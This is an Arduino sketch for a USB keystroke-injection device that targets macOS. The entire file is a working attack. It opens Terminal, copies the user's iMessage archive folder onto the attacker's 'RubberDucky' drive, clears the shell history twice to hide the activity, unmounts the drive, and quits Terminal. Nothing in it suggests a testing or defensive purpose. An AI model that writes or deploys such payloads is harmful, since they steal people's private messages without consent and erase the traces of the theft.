#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  CommandAtRunBarOSX("terminal");
  delay(3000);
  Keyboard.println("cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/");
  delay(3000);
  Keyboard.println("history -c");
  delay(3000);
  Keyboard.println("diskutil umount /Volumes/RubberDucky");
  delay(3000);
  Keyboard.println("history -c");
  delay(3000);
  Keyboard.println("echo 5A13X99");
  delay(3000);
  Keyboard.println("exit");
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  while(1);
}
